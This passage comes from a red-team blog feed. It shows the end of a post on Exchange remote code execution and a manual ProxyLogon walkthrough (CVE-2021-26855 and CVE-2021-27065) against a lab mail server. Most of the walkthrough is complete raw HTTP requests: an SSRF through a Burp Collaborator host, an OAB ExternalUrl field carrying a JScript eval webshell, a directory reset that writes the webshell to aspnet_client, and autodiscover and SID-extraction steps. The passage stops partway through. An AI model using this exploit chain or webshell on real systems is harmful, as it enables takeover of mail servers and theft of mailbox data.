class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20RCE%20method/iShot2021-07-2916.42.29.png"></p><pre class="line-numbers language-none"><code class="language-none">you can also write into the iis web application dir, like this you we have a webshell Note: if you write the shell in the ecp dir, you must use cookie to connect，if you write the shell in the owa dir like this, you don&#39;t need the cookie to connect!!!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20RCE%20method/iShot2021-07-2916.42.37.png"></p><h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><pre class="line-numbers language-none"><code class="language-none">maybe in your PC, you don&#39;t have the py environment，you can use the powershell to success, like this to use the calc.exeexchange -s https:&#x2F;&#x2F;192.168.3.144&#x2F; -u micle@rootkit.org -p Admin12345 -c calc.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20RCE%20method/iShot2021-07-2916.42.42.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20RCE%20method/iShot2021-07-2916.42.56.png"></p><h3 id="Another-can-be-use-dir-amp-VIEWSTATEGENERATOR"><a href="#Another-can-be-use-dir-amp-VIEWSTATEGENERATOR" class="headerlink" title="Another can be use dir &amp; __VIEWSTATEGENERATOR"></a>Another can be use dir &amp; __VIEWSTATEGENERATOR</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;ecp&#x2F;PersonalSettings&#x2F;HomePage.aspx?showhelp&#x3D;false&amp;__VIEWSTATEGENERATOR&#x3D;1D01FD4E&#x2F;ecp&#x2F;PersonalSettings&#x2F;HomePage.aspx?showhelp&#x3D;false&amp;__VIEWSTATEGENERATOR&#x3D;1D01FD4E&#x2F;ecp&#x2F;Organize&#x2F;AutomaticReplies.slab?showhelp&#x3D;false&amp;__VIEWSTATEGENERATOR&#x3D;FD338EE0&#x2F;ecp&#x2F;RulesEditor&#x2F;InboxRules.slab?showhelp&#x3D;false&amp;__VIEWSTATEGENERATOR&#x3D;FD338EE0&#x2F;ecp&#x2F;Organize&#x2F;DeliveryReports.slab?showhelp&#x3D;false&amp;__VIEWSTATEGENERATOR&#x3D;FD338EE0&#x2F;ecp&#x2F;MyGroups&#x2F;PersonalGroups.aspx?showhelp&#x3D;false&amp;__VIEWSTATEGENERATOR&#x3D;A767F62B&#x2F;ecp&#x2F;MyGroups&#x2F;ViewDistributionGroup.aspx?pwmcid&#x3D;1&amp;id&#x3D;38f4bec5-704f-4272-a654-95d53150e2ae&amp;ReturnObjectType&#x3D;1__VIEWSTATEGENERATOR&#x3D;321473B8&#x2F;ecp&#x2F;Customize&#x2F;Messaging.aspx?showhelp&#x3D;false&amp;__VIEWSTATEGENERATOR&#x3D;9C5731F0&#x2F;ecp&#x2F;Customize&#x2F;General.aspx?showhelp&#x3D;false&amp;__VIEWSTATEGENERATOR&#x3D;72B13321&#x2F;ecp&#x2F;Customize&#x2F;Calendar.aspx?showhelp&#x3D;false&amp;__VIEWSTATEGENERATOR&#x3D;4AD51055&#x2F;ecp&#x2F;Customize&#x2F;SentItems.aspx?showhelp&#x3D;false&amp; __VIEWSTATEGENERATOR&#x3D;4466B13F&#x2F;ecp&#x2F;PersonalSettings&#x2F;Password.aspx?showhelp&#x3D;false&amp;__VIEWSTATEGENERATOR&#x3D;59543DCA&#x2F;ecp&#x2F;SMS&#x2F;TextMessaging.slab?showhelp&#x3D;false&amp;__VIEWSTATEGENERATOR&#x3D;FD338EE0&#x2F;ecp&#x2F;TroubleShooting&#x2F;MobileDevices.slab?showhelp&#x3D;false&amp;__VIEWSTATEGENERATOR&#x3D;FD338EE0&#x2F;ecp&#x2F;Customize&#x2F;Regional.aspx?showhelp&#x3D;false&amp;__VIEWSTATEGENERATOR&#x3D;9097CD08&#x2F;ecp&#x2F;MyGroups&#x2F;SearchAllGroups.slab?pwmcid&#x3D;3&amp;ReturnObjectType&#x3D;1__VIEWSTATEGENERATOR&#x3D;FD338EE0&#x2F;ecp&#x2F;Security&#x2F;BlockOrAllow.aspx?showhelp&#x3D;false&amp;__VIEWSTATEGENERATOR&#x3D;362253EF<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> RCE </tag>
            
            <tag> Exchange </tag>
            
            <tag> CVE-2020-17144 </tag>
            
            <tag> CVE-2020-16875 </tag>
            
            <tag> CVE-2020-0688 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ProxyLogon Utilization method (Manual use)</title>
      <link href="2021/07/27/proxylogon-utilization-method-manual-use/"/>
      <url>2021/07/27/proxylogon-utilization-method-manual-use/</url>
      
        <content type="html"><![CDATA[<h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">Having written a previous article on successful exploits, in order to figure out what was wrong with the locally built environment that didn&#39;t work, let&#39;s dive into the relevant data packages and principles againNote: There are some problems with the online exp, and the script needs to be modified twice to ensure the success of using it. For example, the following script output is displayed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.43.42.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.44.03.png"></p><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">It is known that the project mainly uses two vulnerabilities to obtain permissions, one SSRF and one file writeCve-2021-26855 SSRF, the problem occurs when the client request is proxied to the server, the vulnerability can obtain the user&#39;s SID, the most important step in the non-interactive attack chainCve-2021-27065 File writing, Although the content to be written cannot be completely controlled, the file name and path can be set arbitrarily. When.aspx is written to a file, a Trojan horse can be inserted into the file to achieve remote controlThe process is as follows<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.44.11.png"></p><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><h3 id="CVE-2021–26855-SSRF"><a href="#CVE-2021–26855-SSRF" class="headerlink" title="CVE-2021–26855-SSRF"></a>CVE-2021–26855-SSRF</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">GET /owa/auth/yyyyyy.js HTTP/1.1Host: mail.yangsir.gitUser-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> WOW64<span class="token punctuation">;</span> rv:47.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/47.0Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>Accept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,en-US<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.5</span>,en<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.3</span>Accept-Encoding: gzip, deflateDNT: <span class="token number">1</span>Referer: https://mail.yangsir.git/owa/auth/logon.aspx?url<span class="token operator">=</span>https%3a%2f%2fmail.yangsir.git%2fecp%2f%3fexsvurl%3d1%26p%3dVirtualDirectories<span class="token operator">&amp;</span><span class="token assign-left variable">reason</span><span class="token operator">=</span><span class="token number">0</span>Cookie: X-AnonResource<span class="token operator">=</span>true<span class="token punctuation">;</span> X-AnonResource-Backend<span class="token operator">=</span>lg5vmst556l4ut5hg01cdlo6txzqnf.burpcollaborator.net/ecp/default.flt?~3X-Forwarded-For: <span class="token number">8.8</span>.8.8Connection: closeCache-Control: max-age<span class="token operator">=</span><span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.44.18.png"></p><h3 id="CVE-2021-27065-File-writing"><a href="#CVE-2021-27065-File-writing" class="headerlink" title="CVE-2021-27065-File writing"></a>CVE-2021-27065-File writing</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">The OAB external URL writes Trojan contentPOST /ecp/DDI/DDIService.svc/SetObject?ActivityCorrelationID<span class="token operator">=</span>e9cf840e-e595-facd-3710-afbe2aad22a8<span class="token operator">&amp;</span><span class="token assign-left variable">schema</span><span class="token operator">=</span>OABVirtualDirectory<span class="token operator">&amp;</span><span class="token assign-left variable">msExchEcpCanary</span><span class="token operator">=</span>54aREH4XW064p9E_YOEzj0AzPh6oUNkIW6PI1a8ziUpOwNZMxxxhaQeRm8wzpYDo18aE9sIw1FY. HTTP/1.1Host: mail.yangsir.gitUser-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> WOW64<span class="token punctuation">;</span> rv:47.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/47.0Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>Accept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,en-US<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.5</span>,en<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.3</span>Accept-Encoding: gzip, deflateDNT: <span class="token number">1</span>X-Requested-With: XMLHttpRequestContent-Type: application/json<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>utf-8Referer: https://mail.yangsir.git/ecp/VDirMgmt/EditOABVDir.aspx?pwmcid<span class="token operator">=</span><span class="token number">5</span><span class="token operator">&amp;</span><span class="token assign-left variable">ReturnObjectType</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token assign-left variable">id</span><span class="token operator">=</span>cde9e494-1dc4-4d03-898c-d00b04b9456fContent-Length: <span class="token number">387</span>Cookie: X-BackEndCookie<span class="token operator">=</span>S-1-5-21-2921479619-1120952621-1804897559-500<span class="token operator">=</span>u56Lnp2ejJqBncfHnMjPzMvSysnOztLLmZyc0sfGzJzSys/PmcjMmsuezczJgYHNz83O0s/H0s3Jq8/NxcvMxc7N<span class="token punctuation">;</span> <span class="token assign-left variable">msExchEcpCanary</span><span class="token operator">=</span>54aREH4XW064p9E_YOEzj0AzPh6oUNkIW6PI1a8ziUpOwNZMxxxhaQeRm8wzpYDo18aE9sIw1FY.<span class="token punctuation">;</span> <span class="token assign-left variable">PrivateComputer</span><span class="token operator">=</span>true<span class="token punctuation">;</span> <span class="token assign-left variable">ClientId</span><span class="token operator">=</span>9C5BDFDA35A147F39F0E2590680F6ABC<span class="token punctuation">;</span> X-OWA-JS-PSD<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token assign-left variable">PBack</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> ASP.NET_SessionId<span class="token operator">=</span>a69af73f-e5f2-4f51-9ad9-d978a9bbce96<span class="token punctuation">;</span> <span class="token assign-left variable">TimeOffset</span><span class="token operator">=</span>-480<span class="token punctuation">;</span> <span class="token assign-left variable">Eac_CmdletLogging</span><span class="token operator">=</span>false<span class="token punctuation">;</span> <span class="token assign-left variable">SrvTrialChecked</span><span class="token operator">=</span>true<span class="token punctuation">;</span> <span class="token assign-left variable">cadata</span><span class="token operator">=</span>06NwEfbphfaRV9ssqyInQlgydWqNPlQtZO3YxBSMwrRa+RalySU/CPAxhy/jqUEy8lAUDRG7wPwtheb4uiGnyiUjR15JHgzKgySIlRG9Azs<span class="token operator">=</span><span class="token punctuation">;</span> <span class="token assign-left variable">cadataTTL</span><span class="token operator">=</span>S4vlaLBame2nk4A/ae0yOg<span class="token operator">==</span><span class="token punctuation">;</span> <span class="token assign-left variable">cadataKey</span><span class="token operator">=</span>Debg0f+yPp6Dg8iiPU42hQ0EpTFD5Yrxj0aWXxSXl/Ta+eoraf3tAPoS7k6BPoQfjVSysCx2EcoYrShKfCT7bKAcpk1S4Kpj9U3NJgIazLSlnC/LHXmUpj02eNmqzUWoosJ90OVm6JqCrPSUkncZBJTBF7BSd7GuerZdW9/2PEPmUnkPOBGkAaGL6mR/QEL4mndw+koqTI0mkXixv/jrjJZomTOupgVS1sOiTkx1N8H19lhzcHHoNfvL+jFFP7ZMpCLkp0hKJUr++MBxNzu/zVieqggH2E5ZOpgEOB1w28uMFrMcTL9GCkOZU06i1jnHnqjgOZTDxwl//18LkjbE5w<span class="token operator">==</span><span class="token punctuation">;</span> <span class="token assign-left variable">cadataIV</span><span class="token operator">=</span>YCiLoW2R3fbX772qkkS+el/FDthDT6A9NOa7N9mChdEtY7U3qSxmkCDcO6GmUk8f6+O8UD3v3xVpFHOtsAR601tzFTGE9kZ399Mpnmf8atZYOLoehVJe8iD7b1NXu0MmQuZTpPNb84dn9lZZOqToffR8XDW2SEvBd7zk42CqoMwpcGUprhXDPdvXql6+tKZXviIuHd/uD8XW9N+KUFwvt2S3oI0sLU6aaKJQyiBOe52v3avwDOVQDR9vQmWdCnk+Z1wU+j7Cy/hsJ2edpWBI/2cwIQJSKhY3Q9YB0Y25/UWv2WaiCP3up90wE/ntrotTKwSiIxD9HsFSMcYsHy5rNg<span class="token operator">==</span><span class="token punctuation">;</span> <span class="token assign-left variable">cadataSig</span><span class="token operator">=</span>FmESD5gnVClB7HLgE81gQgjsXXQE6T3sg/aQ4K1gx199E16V5Owoqt2GZ26aikBGOUMUgyGy+MTrVrNWoTT6yh4G7Ax/RjahIXFZ8CBg+Ys7QZXP/zoCeR2jRQBGhNb/snHpPBb609i6Xabxsz2zf8ZIk5Z4Pq29oKBBSpQF5v8rE9Qy/9qkxwsejDh4i7+dl+gnXUXd5k51cIzZO7VfL+etT76/v6d3v1SabnY5gstaIn0kCsfAtyqQA7px3hm7i4puPa50ovFebpkkPcSfvErKlB+H4SLkJzBAJbBZaWgh2lC4sZpFeSG/MOfSLYuCE5Ccev70mK+VKeCFaM+2bQ<span class="token operator">==</span>X-Forwarded-For: <span class="token number">8.8</span>.8.8Connection: close<span class="token punctuation">&#123;</span><span class="token string">"identity"</span>:<span class="token punctuation">&#123;</span><span class="token string">"__type"</span><span class="token builtin class-name">:</span><span class="token string">"Identity:ECP"</span>,<span class="token string">"DisplayName"</span><span class="token builtin class-name">:</span><span class="token string">"OAB (Default Web Site)"</span>,<span class="token string">"RawIdentity"</span><span class="token builtin class-name">:</span><span class="token string">"cde9e494-1dc4-4d03-898c-d00b04b9456f"</span><span class="token punctuation">&#125;</span>,<span class="token string">"properties"</span>:<span class="token punctuation">&#123;</span><span class="token string">"Parameters"</span>:<span class="token punctuation">&#123;</span><span class="token string">"__type"</span><span class="token builtin class-name">:</span><span class="token string">"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel"</span>,<span class="token string">"ExternalUrl"</span><span class="token builtin class-name">:</span><span class="token string">"http://mytest/&lt;script language=<span class="token entity" title="\&quot;">\"</span>JScript<span class="token entity" title="\&quot;">\"</span> runat=<span class="token entity" title="\&quot;">\"</span>server<span class="token entity" title="\&quot;">\"</span>> function Page_Load()&#123;/**/eval(Request[<span class="token entity" title="\&quot;">\"</span>code<span class="token entity" title="\&quot;">\"</span>],<span class="token entity" title="\&quot;">\"</span>unsafe<span class="token entity" title="\&quot;">\"</span>);&#125;&lt;/script>"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.44.24.png"></p><pre class="line-numbers language-none"><code class="language-none">Mainly focus on ActivityCorrelationID, msExchEcpCanary, the latter use is very important<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.44.32.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rest virtual <span class="token function">dir</span>POST /ecp/DDI/DDIService.svc/SetObject?ActivityCorrelationID<span class="token operator">=</span>06bd9c20-bcbb-e3bb-9501-9b4acca3cf39<span class="token operator">&amp;</span><span class="token assign-left variable">schema</span><span class="token operator">=</span>ResetOABVirtualDirectory<span class="token operator">&amp;</span><span class="token assign-left variable">msExchEcpCanary</span><span class="token operator">=</span>54aREH4XW064p9E_YOEzj0AzPh6oUNkIW6PI1a8ziUpOwNZMxxxhaQeRm8wzpYDo18aE9sIw1FY. HTTP/1.1Host: mail.yangsir.gitUser-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> WOW64<span class="token punctuation">;</span> rv:47.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/47.0Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>Accept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,en-US<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.5</span>,en<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.3</span>Accept-Encoding: gzip, deflateDNT: <span class="token number">1</span>X-Requested-With: XMLHttpRequestContent-Type: application/json<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>utf-8Referer: https://mail.yangsir.git/ecp/VDirMgmt/ResetVirtualDirectory.aspx?pwmcid<span class="token operator">=</span><span class="token number">8</span><span class="token operator">&amp;</span><span class="token assign-left variable">ReturnObjectType</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token assign-left variable">id</span><span class="token operator">=</span>cde9e494-1dc4-4d03-898c-d00b04b9456f<span class="token operator">&amp;</span><span class="token assign-left variable">schema</span><span class="token operator">=</span>ResetOABVirtualDirectoryContent-Length: <span class="token number">321</span>Cookie: X-BackEndCookie<span class="token operator">=</span>S-1-5-21-2921479619-1120952621-1804897559-500<span class="token operator">=</span>u56Lnp2ejJqBncfHnMjPzMvSysnOztLLmZyc0sfGzJzSys/PmcjMmsuezczJgYHNz83O0s/H0s3Jq8/NxcvIxczL<span class="token punctuation">;</span> <span class="token assign-left variable">msExchEcpCanary</span><span class="token operator">=</span>54aREH4XW064p9E_YOEzj0AzPh6oUNkIW6PI1a8ziUpOwNZMxxxhaQeRm8wzpYDo18aE9sIw1FY.<span class="token punctuation">;</span> <span class="token assign-left variable">PrivateComputer</span><span class="token operator">=</span>true<span class="token punctuation">;</span> <span class="token assign-left variable">ClientId</span><span class="token operator">=</span>9C5BDFDA35A147F39F0E2590680F6ABC<span class="token punctuation">;</span> X-OWA-JS-PSD<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token assign-left variable">PBack</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> ASP.NET_SessionId<span class="token operator">=</span>a69af73f-e5f2-4f51-9ad9-d978a9bbce96<span class="token punctuation">;</span> <span class="token assign-left variable">TimeOffset</span><span class="token operator">=</span>-480<span class="token punctuation">;</span> <span class="token assign-left variable">Eac_CmdletLogging</span><span class="token operator">=</span>false<span class="token punctuation">;</span> <span class="token assign-left variable">SrvTrialChecked</span><span class="token operator">=</span>true<span class="token punctuation">;</span> <span class="token assign-left variable">cadata</span><span class="token operator">=</span>06NwEfbphfaRV9ssqyInQlgydWqNPlQtZO3YxBSMwrRa+RalySU/CPAxhy/jqUEy8lAUDRG7wPwtheb4uiGnyiUjR15JHgzKgySIlRG9Azs<span class="token operator">=</span><span class="token punctuation">;</span> <span class="token assign-left variable">cadataTTL</span><span class="token operator">=</span>S4vlaLBame2nk4A/ae0yOg<span class="token operator">==</span><span class="token punctuation">;</span> <span class="token assign-left variable">cadataKey</span><span class="token operator">=</span>Debg0f+yPp6Dg8iiPU42hQ0EpTFD5Yrxj0aWXxSXl/Ta+eoraf3tAPoS7k6BPoQfjVSysCx2EcoYrShKfCT7bKAcpk1S4Kpj9U3NJgIazLSlnC/LHXmUpj02eNmqzUWoosJ90OVm6JqCrPSUkncZBJTBF7BSd7GuerZdW9/2PEPmUnkPOBGkAaGL6mR/QEL4mndw+koqTI0mkXixv/jrjJZomTOupgVS1sOiTkx1N8H19lhzcHHoNfvL+jFFP7ZMpCLkp0hKJUr++MBxNzu/zVieqggH2E5ZOpgEOB1w28uMFrMcTL9GCkOZU06i1jnHnqjgOZTDxwl//18LkjbE5w<span class="token operator">==</span><span class="token punctuation">;</span> <span class="token assign-left variable">cadataIV</span><span class="token operator">=</span>YCiLoW2R3fbX772qkkS+el/FDthDT6A9NOa7N9mChdEtY7U3qSxmkCDcO6GmUk8f6+O8UD3v3xVpFHOtsAR601tzFTGE9kZ399Mpnmf8atZYOLoehVJe8iD7b1NXu0MmQuZTpPNb84dn9lZZOqToffR8XDW2SEvBd7zk42CqoMwpcGUprhXDPdvXql6+tKZXviIuHd/uD8XW9N+KUFwvt2S3oI0sLU6aaKJQyiBOe52v3avwDOVQDR9vQmWdCnk+Z1wU+j7Cy/hsJ2edpWBI/2cwIQJSKhY3Q9YB0Y25/UWv2WaiCP3up90wE/ntrotTKwSiIxD9HsFSMcYsHy5rNg<span class="token operator">==</span><span class="token punctuation">;</span> <span class="token assign-left variable">cadataSig</span><span class="token operator">=</span>FmESD5gnVClB7HLgE81gQgjsXXQE6T3sg/aQ4K1gx199E16V5Owoqt2GZ26aikBGOUMUgyGy+MTrVrNWoTT6yh4G7Ax/RjahIXFZ8CBg+Ys7QZXP/zoCeR2jRQBGhNb/snHpPBb609i6Xabxsz2zf8ZIk5Z4Pq29oKBBSpQF5v8rE9Qy/9qkxwsejDh4i7+dl+gnXUXd5k51cIzZO7VfL+etT76/v6d3v1SabnY5gstaIn0kCsfAtyqQA7px3hm7i4puPa50ovFebpkkPcSfvErKlB+H4SLkJzBAJbBZaWgh2lC4sZpFeSG/MOfSLYuCE5Ccev70mK+VKeCFaM+2bQ<span class="token operator">==</span>X-Forwarded-For: <span class="token number">8.8</span>.8.8Connection: close<span class="token punctuation">&#123;</span><span class="token string">"identity"</span>:<span class="token punctuation">&#123;</span><span class="token string">"__type"</span><span class="token builtin class-name">:</span><span class="token string">"Identity:ECP"</span>,<span class="token string">"DisplayName"</span><span class="token builtin class-name">:</span><span class="token string">"OAB (Default Web Site)"</span>,<span class="token string">"RawIdentity"</span><span class="token builtin class-name">:</span><span class="token string">"cde9e494-1dc4-4d03-898c-d00b04b9456f"</span><span class="token punctuation">&#125;</span>,<span class="token string">"properties"</span>:<span class="token punctuation">&#123;</span><span class="token string">"Parameters"</span>:<span class="token punctuation">&#123;</span><span class="token string">"__type"</span><span class="token builtin class-name">:</span><span class="token string">"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel"</span>,<span class="token string">"FilePathName"</span><span class="token builtin class-name">:</span><span class="token string">"<span class="token entity" title="\\">\\</span><span class="token entity" title="\\">\\</span>127.0.0.1<span class="token entity" title="\\">\\</span>c$<span class="token entity" title="\\">\\</span>inetpub<span class="token entity" title="\\">\\</span>wwwroot<span class="token entity" title="\\">\\</span>aspnet_client<span class="token entity" title="\\">\\</span>yangsir.aspx"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.44.55.png"></p><pre class="line-numbers language-none"><code class="language-none">confirm you are success<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.45.02.png"></p><pre class="line-numbers language-none"><code class="language-none">So far, high permission is required. To obtain the high permission email account, the SSRF obtains the information to perform file writing<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Manual-use-according-to-exp"><a href="#Manual-use-according-to-exp" class="headerlink" title="Manual use according to exp"></a>Manual use according to exp</h2><h3 id="Get-fqdn"><a href="#Get-fqdn" class="headerlink" title="Get fqdn"></a>Get fqdn</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.45.10.png"></p><pre class="line-numbers language-none"><code class="language-none">The FQDN: YANGDC; you can be obtained from the return header x-feserver<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.45.17.png"></p><h3 id="Get-legacydn"><a href="#Get-legacydn" class="headerlink" title="Get legacydn"></a>Get legacydn</h3><pre class="line-numbers language-none"><code class="language-none">Use access to the FQDN, through access to the internal autodiscover&#x2F;autodiscover SSRF. XML to obtain corresponding legacydn email accounts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.45.22.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">POST /ecp/qqq.js HTTP/1.1Host: yangsirConnection: closeAccept-Encoding: gzip, deflateAccept: */*User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">6.3</span><span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/86.0.4240.75 Safari/537.36ConTent-Type: text/xmlCookie: X-BEResource<span class="token operator">=</span>YANGDC/autodiscover/autodiscover.xml?a<span class="token operator">=~</span><span class="token number">1942062522</span><span class="token punctuation">;</span>Content-Length: <span class="token number">343</span><span class="token operator">&lt;</span>Autodiscover <span class="token assign-left variable">xmlns</span><span class="token operator">=</span><span class="token string">"http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>Request<span class="token operator">></span>      <span class="token operator">&lt;</span>EMailAddress<span class="token operator">></span>administrator@yangsir.git<span class="token operator">&lt;</span>/EMailAddress<span class="token operator">></span> <span class="token operator">&lt;</span>AcceptableResponseSchema<span class="token operator">></span>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a<span class="token operator">&lt;</span>/AcceptableResponseSchema<span class="token operator">></span>    <span class="token operator">&lt;</span>/Request<span class="token operator">></span><span class="token operator">&lt;</span>/Autodiscover<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.45.31.png"></p><h3 id="Get-sid"><a href="#Get-sid" class="headerlink" title="Get sid"></a>Get sid</h3><pre class="line-numbers language-none"><code class="language-none">Request the &#x2F;mapi&#x2F;emsmdb interface by obtaining the legacyDN combination string, and make it report an error, and return the complete SIDstring：\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img 